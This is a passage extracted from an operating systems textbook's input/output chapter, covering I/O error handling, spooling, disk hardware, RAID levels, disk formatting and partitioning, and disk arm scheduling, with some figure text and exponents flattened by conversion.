Reporting\r\nErrors are far more common in the context of I/O than in other contexts. When\r\nthey occur, the operating system must handle them as best it can. Many errors are\r\ndevice specific and must be handled by the appropriate driver, but the framework\r\nfor error handling is device independent.\r\nOne class of I/O errors is programming errors. These occur when a process\r\nasks for something impossible, such as writing to an input device (keyboard, scan\u0002ner, mouse, etc.) or reading from an output device (printer, plotter, etc.). Other er\u0002rors are providing an invalid buffer address or other parameter, and specifying an\r\ninvalid device (e.g., disk 3 when the system has only two disks), and so on. The\r\naction to take on these errors is straightforward: just report back an error code to\r\nthe caller.\r\nAnother class of errors is the class of actual I/O errors, for example, trying to\r\nwrite a disk block that has been damaged or trying to read from a camcorder that\r\nhas been switched off. In these circumstances, it is up to the driver to determine\r\nwhat to do. If the driver does not know what to do, it may pass the problem back\r\nup to device-independent software.\r\nWhat this software does depends on the environment and the nature of the\r\nerror. If it is a simple read error and there is an interactive user available, it may\r\ndisplay a dialog box asking the user what to do. The options may include retrying a\r\ncertain number of times, ignoring the error, or killing the calling process. If there\r\nis no user available, probably the only real option is to have the system call fail\r\nwith an error code.\r\nHowever, some errors cannot be handled this way. For example, a critical data\r\nstructure, such as the root directory or free block list, may have been destroyed. In\r\nthis case, the system may have to display an error message and terminate. There is\r\nnot much else it can do.\r\nAllocating and Releasing Dedicated Devices\r\nSome devices, such as printers, can be used only by a single process at any\r\ngiven moment. It is up to the operating system to examine requests for device\r\nusage and accept or reject them, depending on whether the requested device is\r\navailable or not. A simple way to handle these requests is to require processes to\r\nperform opens on the special files for devices directly. If the device is unavailable,\r\nthe open fails. Closing such a dedicated device then releases it.\r\nAn alternative approach is to have special mechanisms for requesting and\r\nreleasing dedicated devices. An attempt to acquire a device that is not available\r\nblocks the caller instead of failing. Blocked processes are put on a queue. Sooner\r\nor later, the requested device becomes available and the first process on the queue\r\nis allowed to acquire it and continue execution.\nSEC. 5.3 I/O SOFTWARE LAYERS 367\r\nDevice-Independent Block Size\r\nDifferent disks may have different sector sizes. It is up to the device-indepen\u0002dent software to hide this fact and provide a uniform block size to higher layers,\r\nfor example, by treating several sectors as a single logical block. In this way, the\r\nhigher layers deal only with abstract devices that all use the same logical block\r\nsize, independent of the physical sector size. Similarly, some character devices de\u0002liver their data one byte at a time (e.g., mice), while others deliver theirs in larger\r\nunits (e.g., Ethernet interfaces). These differences may also be hidden."
          },
          "5.3.4 User-Space I/O Software": {
            "page": 398,
            "content": "5.3.4 User-Space I/O Software\r\nAlthough most of the I/O software is within the operating system, a small por\u0002tion of it consists of libraries linked together with user programs, and even whole\r\nprograms running outside the kernel. System calls, including the I/O system calls,\r\nare normally made by library procedures. When a C program contains the call\r\ncount = write(fd, buffer, nbytes);\r\nthe library procedure write might be linked with the program and contained in the\r\nbinary program present in memory at run time. In other systems, libraries can be\r\nloaded during program execution. Either way, the collection of all these library\r\nprocedures is clearly part of the I/O system.\r\nWhile these procedures do little more than put their parameters in the ap\u0002propriate place for the system call, other I/O procedures actually do real work. In\r\nparticular, formatting of input and output is done by library procedures. One ex\u0002ample from C is printf, which takes a format string and possibly some variables as\r\ninput, builds an ASCII string, and then calls wr ite to output the string. As an ex\u0002ample of printf, consider the statement\r\npr intf(\"The square of %3d is %6d\\n\", i, i*i);\r\nIt formats a string consisting of the 14-character string ‘‘The square of ’’ followed\r\nby the value i as a 3-character string, then the 4-character string ‘‘ is ’’, then i\r\n2 as 6\r\ncharacters, and finally a line feed.\r\nAn example of a similar procedure for input is scanf, which reads input and\r\nstores it into variables described in a format string using the same syntax as printf.\r\nThe standard I/O library contains a number of procedures that involve I/O and all\r\nrun as part of user programs.\r\nNot all user-level I/O software consists of library procedures. Another impor\u0002tant category is the spooling system. Spooling is a way of dealing with dedicated\r\nI/O devices in a multiprogramming system. Consider a typical spooled device: a\r\nprinter. Although it would be technically easy to let any user process open the\r\ncharacter special file for the printer, suppose a process opened it and then did noth\u0002ing for hours. No other process could print anything.\n368 INPUT/OUTPUT CHAP. 5\r\nInstead what is done is to create a special process, called a daemon, and a spe\u0002cial directory, called a spooling directory. To print a file, a process first generates\r\nthe entire file to be printed and puts it in the spooling directory. It is up to the dae\u0002mon, which is the only process having permission to use the printer’s special file,\r\nto print the files in the directory. By protecting the special file against direct use by\r\nusers, the problem of having someone keeping it open unnecessarily long is elimi\u0002nated.\r\nSpooling is used not only for printers. It is also used in other I/O situations.\r\nFor example, file transfer over a network often uses a network daemon. To send a\r\nfile somewhere, a user puts it in a network spooling directory. Later on, the net\u0002work daemon takes it out and transmits it. One particular use of spooled file trans\u0002mission is the USENET News system (now part of Google Groups). This network\r\nconsists of millions of machines around the world communicating using the Inter\u0002net. Thousands of news groups exist on many topics. To post a news message, the\r\nuser invokes a news program, which accepts the message to be posted and then\r\ndeposits it in a spooling directory for transmission to other machines later. The en\u0002tire news system runs outside the operating system.\r\nFigure 5-17 summarizes the I/O system, showing all the layers and the princi\u0002pal functions of each layer. Starting at the bottom, the layers are the hardware, in\u0002terrupt handlers, device drivers, device-independent software, and finally the user\r\nprocesses.\r\nI/O\r\nrequest\r\nLayer\r\nI/O\r\nreply I/O functions\r\nMake I/O call; format I/O; spooling\r\nNaming, protection, blocking, buffering, allocation\r\nSet up device registers; check status\r\nWake up driver when I/O completed\r\nPerform I/O operation\r\nUser processes\r\nDevice-independent\r\nsoftware\r\nDevice drivers\r\nInterrupt handlers\r\nHardware\r\nFigure 5-17. Layers of the I/O system and the main functions of each layer.\r\nThe arrows in Fig. 5-17 show the flow of control. When a user program tries to\r\nread a block from a file, for example, the operating system is invoked to carry out\r\nthe call. The device-independent software looks for it, say, in the buffer cache. If\r\nthe needed block is not there, it calls the device driver to issue the request to the\r\nhardware to go get it from the disk. The process is then blocked until the disk oper\u0002ation has been completed and the data are safely available in the caller’s buffer.\nSEC. 5.3 I/O SOFTWARE LAYERS 369\r\nWhen the disk is finished, the hardware generates an interrupt. The interrupt\r\nhandler is run to discover what has happened, that is, which device wants attention\r\nright now. It then extracts the status from the device and wakes up the sleeping\r\nprocess to finish off the I/O request and let the user process continue."
          }
        }
      },
      "5.4 DISKS": {
        "page": 400,
        "children": {
          "5.4.1 Disk Hardware": {
            "page": 400,
            "content": "5.4.1 Disk Hardware\r\nDisks come in a variety of types. The most common ones are the magnetic\r\nhard disks. They are characterized by the fact that reads and writes are equally\r\nfast, which makes them suitable as secondary memory (paging, file systems, etc.).\r\nArrays of these disks are sometimes used to provide highly reliable storage. For\r\ndistribution of programs, data, and movies, optical disks (DVDs and Blu-ray) are\r\nalso important. Finally, solid-state disks are increasingly popular as they are fast\r\nand do not contain moving parts. In the following sections we will discuss mag\u0002netic disks as an example of the hardware and then describe the software for disk\r\ndevices in general.\r\nMagnetic Disks\r\nMagnetic disks are organized into cylinders, each one containing as many\r\ntracks as there are heads stacked vertically. The tracks are divided into sectors,\r\nwith the number of sectors around the circumference typically being 8 to 32 on\r\nfloppy disks, and up to several hundred on hard disks. The number of heads varies\r\nfrom 1 to about 16.\r\nOlder disks have little electronics and just deliver a simple serial bit stream.\r\nOn these disks, the controller does most of the work. On other disks, in particular,\r\nIDE (Integrated Drive Electronics) and SATA (Serial ATA) disks, the disk drive\r\nitself contains a microcontroller that does considerable work and allows the real\r\ncontroller to issue a set of higher-level commands. The controller often does track\r\ncaching, bad-block remapping, and much more.\r\nA device feature that has important implications for the disk driver is the possi\u0002bility of a controller doing seeks on two or more drives at the same time. These are\r\nknown as overlapped seeks. While the controller and software are waiting for a\r\nseek to complete on one drive, the controller can initiate a seek on another drive.\r\nMany controllers can also read or write on one drive while seeking on one or more\r\nother drives, but a floppy disk controller cannot read or write on two drives at the\n370 INPUT/OUTPUT CHAP. 5\r\nsame time. (Reading or writing requires the controller to move bits on a microsec\u0002ond time scale, so one transfer uses up most of its computing power.) The situa\u0002tion is different for hard disks with integrated controllers, and in a system with\r\nmore than one of these hard drives they can operate simultaneously, at least to the\r\nextent of transferring between the disk and the controller’s buffer memory. Only\r\none transfer between the controller and the main memory is possible at once, how\u0002ev er. The ability to perform two or more operations at the same time can reduce the\r\nav erage access time considerably.\r\nFigure 5-18 compares parameters of the standard storage medium for the origi\u0002nal IBM PC with parameters of a disk made three decades later to show how much\r\ndisks changed in that time. It is interesting to note that not all parameters have im\u0002proved as much. Average seek time is almost 9 times better than it was, transfer\r\nrate is 16,000 times better, while capacity is up by a factor of 800,000. This pattern\r\nhas to do with relatively gradual improvements in the moving parts, but much\r\nhigher bit densities on the recording surfaces.\r\nParameter IBM 360-KB floppy disk WD 3000 HLFS hard disk\r\nNumber of cylinders 40 36,481\r\nTr acks per cylinder 2 255\r\nSectors per track 9 63 (avg)\r\nSectors per disk 720 586,072,368\r\nBytes per sector 512 512\r\nDisk capacity 360 KB 300 GB\r\nSeek time (adjacent cylinders) 6 msec 0.7 msec\r\nSeek time (average case) 77 msec 4.2 msec\r\nRotation time 200 msec 6 msec\r\nTime to transfer 1 sector 22 msec 1.4 μsec\r\nFigure 5-18. Disk parameters for the original IBM PC 360-KB floppy disk and a\r\nWestern Digital WD 3000 HLFS (‘‘Velociraptor’’) hard disk.\r\nOne thing to be aware of in looking at the specifications of modern hard disks\r\nis that the geometry specified, and used by the driver software, is almost always\r\ndifferent from the physical format. On old disks, the number of sectors per track\r\nwas the same for all cylinders. Modern disks are divided into zones with more sec\u0002tors on the outer zones than the inner ones. Fig. 5-19(a) illustrates a tiny disk with\r\ntwo zones. The outer zone has 32 sectors per track; the inner one has 16 sectors per\r\ntrack. A real disk, such as the WD 3000 HLFS, typically has 16 or more zones,\r\nwith the number of sectors increasing by about 4% per zone as one goes out from\r\nthe innermost to the outermost zone.\r\nTo hide the details of how many sectors each track has, most modern disks\r\nhave a virtual geometry that is presented to the operating system. The software is\r\ninstructed to act as though there are x cylinders, y heads, and z sectors per track.\nSEC. 5.4 DISKS 371\r\n0 1 2 3 4 5\r\n6\r\n9 8 7\r\n10 111213 1415\r\n0 1\r\n2\r\n3\r\n4\r\n5\r\n6 7 8 9 10\r\n11\r\n12\r\n31\r\n41\r\n61 51\r\n71\r\n81\r\n19\r\n20\r\n21 22 23 24 25\r\n26\r\n27\r\n28\r\n29 30 31\r\n0\r\n1\r\n2\r\n3\r\n4 5 6 7\r\n89\r\n10\r\n11\r\n31 21\r\n41\r\n15 16 17 18 19 20\r\n21\r\n22\r\n23 24\r\nFigure 5-19. (a) Physical geometry of a disk with two zones. (b) A possible vir\u0002tual geometry for this disk.\r\nThe controller then remaps a request for (x, y, z) onto the real cylinder, head, and\r\nsector. A possible virtual geometry for the physical disk of Fig. 5-19(a) is shown\r\nin Fig. 5-19(b). In both cases the disk has 192 sectors, only the published arrange\u0002ment is different than the real one.\r\nFor PCs, the maximum values for these three parameters are often (65535, 16,\r\nand 63), due to the need to be backward compatible with the limitations of the\r\noriginal IBM PC. On this machine, 16-, 4-, and 6-bit fields were used to specify\r\nthese numbers, with cylinders and sectors numbered starting at 1 and heads num\u0002bered starting at 0. With these parameters and 512 bytes per sector, the largest pos\u0002sible disk is 31.5 GB. To get around this limit, all modern disks now support a sys\u0002tem called logical block addressing, in which disk sectors are just numbered con\u0002secutively starting at 0, without regard to the disk geometry.\r\nRAID\r\nCPU performance has been increasing exponentially over the past decade,\r\nroughly doubling every 18 months. Not so with disk performance. In the 1970s,\r\nav erage seek times on minicomputer disks were 50 to 100 msec. Now seek times\r\nare still a few msec. In most technical industries (say, automobiles or aviation), a\r\nfactor of 5 to 10 performance improvement in two decades would be major news\r\n(imagine 300-MPG cars), but in the computer industry it is an embarrassment.\r\nThus the gap between CPU performance and (hard) disk performance has become\r\nmuch larger over time. Can anything be done to help?\n372 INPUT/OUTPUT CHAP. 5\r\nYes! As we have seen, parallel processing is increasingly being used to speed\r\nup CPU performance. It has occurred to various people over the years that parallel\r\nI/O might be a good idea, too. In their 1988 paper, Patterson et al. suggested six\r\nspecific disk organizations that could be used to improve disk performance, re\u0002liability, or both (Patterson et al., 1988). These ideas were quickly adopted by in\u0002dustry and have led to a new class of I/O device called a RAID. Patterson et al.\r\ndefined RAID as Redundant Array of Inexpensive Disks, but industry redefined\r\nthe I to be ‘‘Independent’’ rather than ‘‘Inexpensive’’ (maybe so they could charge\r\nmore?). Since a villain was also needed (as in RISC vs. CISC, also due to Patter\u0002son), the bad guy here was the SLED (Single Large Expensive Disk).\r\nThe fundamental idea behind a RAID is to install a box full of disks next to the\r\ncomputer, typically a large server, replace the disk controller card with a RAID\r\ncontroller, copy the data over to the RAID, and then continue normal operation. In\r\nother words, a RAID should look like a SLED to the operating system but have\r\nbetter performance and better reliability. In the past, RAIDs consisted almost ex\u0002clusively of a RAID SCSI controller plus a box of SCSI disks, because the per\u0002formance was good and modern SCSI supports up to 15 disks on a single con\u0002troller. Now adays, many manufacturers also offer (less expensive) RAIDs based on\r\nSATA. In this way, no software changes are required to use the RAID, a big sell\u0002ing point for many system administrators.\r\nIn addition to appearing like a single disk to the software, all RAIDs have the\r\nproperty that the data are distributed over the drives, to allow parallel operation.\r\nSeveral different schemes for doing this were defined by Patterson et al. Now\u0002adays, most manufacturers refer to the seven standard configurations as RAID\r\nlevel 0 through RAID level 6. In addition, there are a few other minor levels that\r\nwe will not discuss. The term ‘‘level’’ is something of a misnomer since no hier\u0002archy is inv olved; there are simply seven different organizations possible.\r\nRAID level 0 is illustrated in Fig. 5-20(a). It consists of viewing the virtual\r\nsingle disk simulated by the RAID as being divided up into strips of k sectors each,\r\nwith sectors 0 to k − 1 being strip 0, sectors k to 2k − 1 strip 1, and so on. For\r\nk = 1, each strip is a sector; for k = 2 a strip is two sectors, etc. The RAID level 0\r\norganization writes consecutive strips over the drives in round-robin fashion, as\r\ndepicted in Fig. 5-20(a) for a RAID with four disk drives.\r\nDistributing data over multiple drives like this is called striping. For example,\r\nif the software issues a command to read a data block consisting of four consecu\u0002tive strips starting at a strip boundary, the RAID controller will break this com\u0002mand up into four separate commands, one for each of the four disks, and have\r\nthem operate in parallel. Thus we have parallel I/O without the software knowing\r\nabout it.\r\nRAID level 0 works best with large requests, the bigger the better. If a request\r\nis larger than the number of drives times the strip size, some drives will get multi\u0002ple requests, so that when they finish the first request they start the second one. It\r\nis up to the controller to split the request up and feed the proper commands to the\nSEC. 5.4 DISKS 373\r\nproper disks in the right sequence and then assemble the results in memory cor\u0002rectly. Performance is excellent and the implementation is straightforward.\r\nRAID level 0 works worst with operating systems that habitually ask for data\r\none sector at a time. The results will be correct, but there is no parallelism and\r\nhence no performance gain. Another disadvantage of this organization is that the\r\nreliability is potentially worse than having a SLED. If a RAID consists of four\r\ndisks, each with a mean time to failure of 20,000 hours, about once every 5000\r\nhours a drive will fail and all the data will be completely lost. A SLED with a\r\nmean time to failure of 20,000 hours would be four times more reliable. Because\r\nno redundancy is present in this design, it is not really a true RAID.\r\nThe next option, RAID level 1, shown in Fig. 5-20(b), is a true RAID. It dupli\u0002cates all the disks, so there are four primary disks and four backup disks. On a\r\nwrite, every strip is written twice. On a read, either copy can be used, distributing\r\nthe load over more drives. Consequently, write performance is no better than for a\r\nsingle drive, but read performance can be up to twice as good. Fault tolerance is\r\nexcellent: if a drive crashes, the copy is simply used instead. Recovery consists of\r\nsimply installing a new drive and copying the entire backup drive to it.\r\nUnlike lev els 0 and 1, which work with strips of sectors, RAID level 2 works\r\non a word basis, possibly even a byte basis. Imagine splitting each byte of the sin\u0002gle virtual disk into a pair of 4-bit nibbles, then adding a Hamming code to each\r\none to form a 7-bit word, of which bits 1, 2, and 4 were parity bits. Further imagine\r\nthat the seven drives of Fig. 5-20(c) were synchronized in terms of arm position\r\nand rotational position. Then it would be possible to write the 7-bit Hamming\r\ncoded word over the seven drives, one bit per drive.\r\nThe Thinking Machines CM-2 computer used this scheme, taking 32-bit data\r\nwords and adding 6 parity bits to form a 38-bit Hamming word, plus an extra bit\r\nfor word parity, and spread each word over 39 disk drives. The total throughput\r\nwas immense, because in one sector time it could write 32 sectors worth of data.\r\nAlso, losing one drive did not cause problems, because loss of a drive amounted to\r\nlosing 1 bit in each 39-bit word read, something the Hamming code could handle\r\non the fly.\r\nOn the down side, this scheme requires all the drives to be rotationally syn\u0002chronized, and it only makes sense with a substantial number of drives (ev en with\r\n32 data drives and 6 parity drives, the overhead is 19%). It also asks a lot of the\r\ncontroller, since it must do a Hamming checksum every bit time.\r\nRAID level 3 is a simplified version of RAID level 2. It is illustrated in\r\nFig. 5-20(d). Here a single parity bit is computed for each data word and written to\r\na parity drive. As in RAID level 2, the drives must be exactly synchronized, since\r\nindividual data words are spread over multiple drives.\r\nAt first thought, it might appear that a single parity bit gives only error detec\u0002tion, not error correction. For the case of random undetected errors, this observa\u0002tion is true. However, for the case of a drive crashing, it provides full 1-bit error\r\ncorrection since the position of the bad bit is known. In the event that a drive\n374 INPUT/OUTPUT CHAP. 5\r\nFigure 5-20. RAID levels 0 through 6. Backup and parity drives are shown shaded.\nSEC. 5.4 DISKS 375\r\ncrashes, the controller just pretends that all its bits are 0s. If a word has a parity\r\nerror, the bit from the dead drive must have been a 1, so it is corrected. Although\r\nboth RAID levels 2 and 3 offer very high data rates, the number of separate I/O re\u0002quests per second they can handle is no better than for a single drive.\r\nRAID levels 4 and 5 work with strips again, not individual words with parity,\r\nand do not require synchronized drives. RAID level 4 [see Fig. 5-20(e)] is like\r\nRAID level 0, with a strip-for-strip parity written onto an extra drive. For example,\r\nif each strip is k bytes long, all the strips are EXCLUSIVE ORed together, re\u0002sulting in a parity strip k bytes long. If a drive crashes, the lost bytes can be\r\nrecomputed from the parity drive by reading the entire set of drives.\r\nThis design protects against the loss of a drive but performs poorly for small\r\nupdates. If one sector is changed, it is necessary to read all the drives in order to\r\nrecalculate the parity, which must then be rewritten. Alternatively, it can read the\r\nold user data and the old parity data and recompute the new parity from them.\r\nEven with this optimization, a small update requires two reads and two writes.\r\nAs a consequence of the heavy load on the parity drive, it may become a bot\u0002tleneck. This bottleneck is eliminated in RAID level 5 by distributing the parity\r\nbits uniformly over all the drives, round-robin fashion, as shown in Fig. 5-20(f).\r\nHowever, in the event of a drive crash, reconstructing the contents of the failed\r\ndrive is a complex process.\r\nRaid level 6 is similar to RAID level 5, except that an additional parity block is\r\nused. In other words, the data is striped across the disks with two parity blocks in\u0002stead of one. As a result, writes are bit more expensive because of the parity calcu\u0002lations, but reads incur no performance penalty. It does offer more reliability (im\u0002agine what happens if RAID level 5 encounters a bad block just when it is rebuild\u0002ing its array)."
          },
          "5.4.2 Disk Formatting": {
            "page": 406,
            "content": "5.4.2 Disk Formatting\r\nA hard disk consists of a stack of aluminum, alloy, or glass platters typically\r\n3.5 inch in diameter (or 2.5 inch on notebook computers). On each platter is\r\ndeposited a thin magnetizable metal oxide. After manufacturing, there is no infor\u0002mation whatsoever on the disk.\r\nBefore the disk can be used, each platter must receive a low-level format done\r\nby software. The format consists of a series of concentric tracks, each containing\r\nsome number of sectors, with short gaps between the sectors. The format of a sec\u0002tor is shown in Fig. 5-21.\r\nPreamble Data ECC\r\nFigure 5-21. A disk sector.\n376 INPUT/OUTPUT CHAP. 5\r\nThe preamble starts with a certain bit pattern that allows the hardware to rec\u0002ognize the start of the sector. It also contains the cylinder and sector numbers and\r\nsome other information. The size of the data portion is determined by the low\u0002level formatting program. Most disks use 512-byte sectors. The ECC field con\u0002tains redundant information that can be used to recover from read errors. The size\r\nand content of this field varies from manufacturer to manufacturer, depending on\r\nhow much disk space the designer is willing to give up for higher reliability and\r\nhow complex an ECC code the controller can handle. A 16-byte ECC field is not\r\nunusual. Furthermore, all hard disks have some number of spare sectors allocated\r\nto be used to replace sectors with a manufacturing defect.\r\nThe position of sector 0 on each track is offset from the previous track when\r\nthe low-level format is laid down. This offset, called cylinder skew, is done to im\u0002prove performance. The idea is to allow the disk to read multiple tracks in one con\u0002tinuous operation without losing data. The nature of the problem can be seen by\r\nlooking at Fig. 5-19(a). Suppose that a request needs 18 sectors starting at sector 0\r\non the innermost track. Reading the first 16 sectors takes one disk rotation, but a\r\nseek is needed to move outward one track to get the 17th sector. By the time the\r\nhead has moved one track, sector 0 has rotated past the head so an entire rotation is\r\nneeded until it comes by again. That problem is eliminated by offsetting the sectors\r\nas shown in Fig. 5-22.\r\nThe amount of cylinder skew depends on the drive geometry. For example, a\r\n10,000-RPM (Revolutions Per Minute) drive rotates in 6 msec. If a track contains\r\n300 sectors, a new sector passes under the head every 20 μsec. If the track-to-track\r\nseek time is 800 μsec, 40 sectors will pass by during the seek, so the cylinder skew\r\nshould be at least 40 sectors, rather than the three sectors shown in Fig. 5-22. It is\r\nworth mentioning that switching between heads also takes a finite time, so there is\r\nhead skew as well as cylinder skew, but head skew is not very large, usually much\r\nless than one sector time.\r\nAs a result of the low-level formatting, disk capacity is reduced, depending on\r\nthe sizes of the preamble, intersector gap, and ECC, as well as the number of spare\r\nsectors reserved. Often the formatted capacity is 20% lower than the unformatted\r\ncapacity. The spare sectors do not count toward the formatted capacity, so all disks\r\nof a given type have exactly the same capacity when shipped, independent of how\r\nmany bad sectors they actually have (if the number of bad sectors exceeds the\r\nnumber of spares, the drive will be rejected and not shipped).\r\nThere is considerable confusion about disk capacity because some manufact\u0002urers advertised the unformatted capacity to make their drives look larger than they\r\nin reality are. For example, let us consider a drive whose unformatted capacity is\r\n200 × 109 bytes. This might be sold as a 200-GB disk. However, after formatting,\r\nposibly only 170 × 109 bytes are available for data. To add to the confusion, the\r\noperating system will probably report this capacity as 158 GB, not 170 GB, be\u0002cause software considers a memory of 1 GB to be 230 (1,073,741,824) bytes, not\r\n109 (1,000,000,000) bytes. It would be better if this were reported as 158 GiB.\nSEC. 5.4 DISKS 377\r\n0 1 2 3 4\r\n5 6 7 8 910 1112 31 41\r\n716151\r\n81 91 202122 2324252627 2829 30 31\r\n29 30 31 0 1 2\r\n3 4 5 6\r\n7\r\n8\r\n9 10 11\r\n41 31 21\r\n51 16 17 18 19 20 21 22\r\n23 24 25 26 27 28\r\n26 27 28 29\r\n30\r\n31 0 1 2 3\r\n4\r\n5\r\n6\r\n7 8\r\n11 01 9\r\n21\r\n13\r\n14\r\n15 16 17 18 19\r\n20\r\n21 22 23 24 25\r\n23 24 25\r\n26\r\n27\r\n28\r\n29\r\n30 31 0 1 2\r\n3\r\n4\r\n5\r\n8 7 6\r\n9\r\n10\r\n11\r\n12 13 14 15 16 17\r\n18\r\n19 20 21 22\r\n20 21 22\r\n23\r\n24\r\n25\r\n26\r\n27 28 29\r\n30\r\n31\r\n0\r\n1\r\n2 4 3 5\r\n6\r\n7\r\n8\r\n9 10 11 12 13 14\r\n15\r\n16\r\n17\r\n18 19\r\n17 18\r\n19\r\n20\r\n21\r\n22\r\n23 24 25\r\n26\r\n27\r\n28\r\n29\r\n03\r\n13 1 0 2\r\n3\r\n4\r\n5\r\n6\r\n7 8 9 10 11\r\n12\r\n13\r\n14\r\n15 16\r\nDirection of disk \r\n rotation \r\n \r\nFigure 5-22. An illustration of cylinder skew.\r\nTo make things even worse, in the world of data communications, 1 Gbps\r\nmeans 1,000,000,000 bits/sec because the prefix giga really does mean 109 (a kilo\u0002meter is 1000 meters, not 1024 meters, after all). Only with memory and disk\r\nsizes do kilo, mega, giga, and tera mean 210, 220, 230, and 240, respectively.\r\nTo avoid confusion, some authors use the prefixes kilo, mega, giga, and tera to\r\nmean 103\r\n, 106, 109, and 1012 respectively, while using kibi, mebi, gibi, and tebi to\r\nmean 210, 220, 230, and 240, respectively. Howev er, the use of the ‘‘b’’ prefixes is\r\nrelatively rare. Just in case you like really big numbers, the prefixes following tebi\r\nare pebi, exbi, zebi, and yobi, so a yobibyte is a whole bunch of bytes (280 to be\r\nprecise).\r\nFormatting also affects performance. If a 10,000-RPM disk has 300 sectors\r\nper track of 512 bytes each, it takes 6 msec to read the 153,600 bytes on a track for\r\na data rate of 25,600,000 bytes/sec or 24.4 MB/sec. It is not possible to go faster\r\nthan this, no matter what kind of interface is present, even if it is a SCSI interface\r\nat 80 MB/sec or 160 MB/sec.\r\nActually reading continuously at this rate requires a large buffer in the con\u0002troller. Consider, for example, a controller with a one-sector buffer that has been\r\ngiven a command to read two consecutive sectors. After reading the first sector\r\nfrom the disk and doing the ECC calculation, the data must be transferred to main\n378 INPUT/OUTPUT CHAP. 5\r\nmemory. While this transfer is taking place, the next sector will fly by the head.\r\nWhen the copy to memory is complete, the controller will have to wait almost an\r\nentire rotation time for the second sector to come around again.\r\nThis problem can be eliminated by numbering the sectors in an interleaved\r\nfashion when formatting the disk. In Fig. 5-23(a), we see the usual numbering pat\u0002tern (ignoring cylinder skew here). In Fig. 5-23(b), we see single interleaving,\r\nwhich gives the controller some breathing space between consecutive sectors in\r\norder to copy the buffer to main memory.\r\n(a)\r\n7 0\r\n4 3\r\n1\r\n2\r\n6\r\n5\r\n(b)\r\n7 0\r\n2 5\r\n4\r\n1\r\n3\r\n6\r\n(c)\r\n5 0\r\n4 1\r\n3\r\n6\r\n2\r\n7\r\nFigure 5-23. (a) No interleaving. (b) Single interleaving. (c) Double interleaving.\r\nIf the copying process is very slow, the double interleaving of Fig. 5-24(c)\r\nmay be needed. If the controller has a buffer of only one sector, it does not matter\r\nwhether the copying from the buffer to main memory is done by the controller, the\r\nmain CPU, or a DMA chip; it still takes some time. To avoid the need for inter\u0002leaving, the controller should be able to buffer an entire track. Most modern con\u0002trollers can buffer many entire tracks.\r\nAfter low-level formatting is completed, the disk is partitioned. Logically, each\r\npartition is like a separate disk. Partitions are needed to allow multiple operating\r\nsystems to coexist. Also, in some cases, a partition can be used for swapping. In\r\nthe x86 and most other computers, sector 0 contains the MBR (Master Boot\r\nRecord), which contains some boot code plus the partition table at the end. The\r\nMBR, and thus support for partition tables, first appeared in IBM PCs in 1983 to\r\nsupport the then-massive 10-MB hard drive in the PC XT. Disks have grown a bit\r\nsince then. As MBR partition entries in most systems are limited to 32 bits, the\r\nmaximum disk size that can be supported with 512 B sectors is 2 TB. For this rea\u0002son, most operating since now also support the new GPT (GUID Partition Table),\r\nwhich supports disk sizes up to 9.4 ZB (9,444,732,965,739,290,426,880 bytes). At\r\nthe time this book went to press, this was considered a lot of bytes.\r\nThe partition table gives the starting sector and size of each partition. On the\r\nx86, the MBR partition table has room for four partitions. If all of them are for\r\nWindows, they will be called C:, D:, E:, and F: and treated as separate drives. If\r\nthree of them are for Windows and one is for UNIX, then Windows will call its\r\npartitions C:, D:, and E:. If a USB drive is added, it will be F:. To be able to boot\r\nfrom the hard disk, one partition must be marked as active in the partition table.\nSEC. 5.4 DISKS 379\r\nThe final step in preparing a disk for use is to perform a high-level format of\r\neach partition (separately). This operation lays down a boot block, the free storage\r\nadministration (free list or bitmap), root directory, and an empty file system. It\r\nalso puts a code in the partition table entry telling which file system is used in the\r\npartition because many operating systems support multiple incompatible file sys\u0002tems (for historical reasons). At this point the system can be booted.\r\nWhen the power is turned on, the BIOS runs initially and then reads in the\r\nmaster boot record and jumps to it. This boot program then checks to see which\r\npartition is active. Then it reads in the boot sector from that partition and runs it.\r\nThe boot sector contains a small program that generally loads a larger bootstrap\r\nloader that searches the file system to find the operating system kernel. That pro\u0002gram is loaded into memory and executed."
          },
          "5.4.3 Disk Arm Scheduling Algorithms": {
            "page": 410,
            "content": "5.4.3 Disk Arm Scheduling Algorithms\r\nIn this section we will look at some issues related to disk drivers in general.\r\nFirst, consider how long it takes to read or write a disk block. The time required is\r\ndetermined by three factors:\r\n1. Seek time (the time to move the arm to the proper cylinder).\r\n2. Rotational delay (how long for the proper sector to appear under the\r\nreading head).\r\n3. Actual data transfer time.\r\nFor most disks, the seek time dominates the other two times, so reducing the mean\r\nseek time can improve system performance substantially.\r\nIf the disk driver accepts requests one at a time and carries them out in that\r\norder, that is, FCFS (First-Come, First-Served), little can be done to optimize\r\nseek time. However, another strategy is possible when the disk is heavily loaded. It\r\nis likely that while the arm is seeking on behalf of one request, other disk requests\r\nmay be generated by other processes. Many disk drivers maintain a table, indexed\r\nby cylinder number, with all the pending requests for each cylinder chained toget\u0002her in a linked list headed by the table entries.\r\nGiven this kind of data structure, we can improve upon the first-come, first\u0002served scheduling algorithm. To see how, consider an imaginary disk with 40 cyl\u0002inders. A request comes in to read a block on cylinder 11. While the seek to cylin\u0002der 11 is in progress, new requests come in for cylinders 1, 36, 16, 34, 9, and 12, in\r\nthat order. They are entered into the table of pending requests, with a separate link\u0002ed list for each cylinder. The requests are shown in Fig. 5-24.\r\nWhen the current request (for cylinder 11) is finished, the disk driver has a\r\nchoice of which request to handle next. Using FCFS, it would go next to cylinder\r\n1, then to 36, and so on. This algorithm would require arm motions of 10, 35, 20,\r\n18, 25, and 3, respectively, for a total of 111 cylinders.\n380 INPUT/OUTPUT CHAP. 5\r\nInitial\r\nposition\r\nPending\r\nrequests\r\nSequence of seeks\r\nCylinder\r\nX X XX X X X\r\n0 5 10 15 20 25 30 35\r\nTime\r\nFigure 5-24. Shortest Seek First (SSF) disk scheduling algorithm.\r\nAlternatively, it could always handle the closest request next, to minimize seek\r\ntime. Given the requests of Fig. 5-24, the sequence is 12, 9, 16, 1, 34, and 36,\r\nshown as the jagged line at the bottom of Fig. 5-24. With this sequence, the arm\r\nmotions are 1, 3, 7, 15, 33, and 2, for a total of 61 cylinders. This algorithm, called\r\nSSF (Shortest Seek First), cuts the total arm motion almost in half compared to\r\nFCFS.\r\nUnfortunately, SSF has a problem. Suppose more requests keep coming in\r\nwhile the requests of Fig. 5-24 are being processed. For example, if, after going to\r\ncylinder 16, a new request for cylinder 8 is present, that request will have priority\r\nover cylinder 1. If a request for cylinder 13 then comes in, the arm will next go to\r\n13, instead of 1. With a heavily loaded disk, the arm will tend to stay in the middle\r\nof the disk most of the time, so requests at either extreme will have to wait until a\r\nstatistical fluctuation in the load causes there to be no requests near the middle. Re\u0002quests far from the 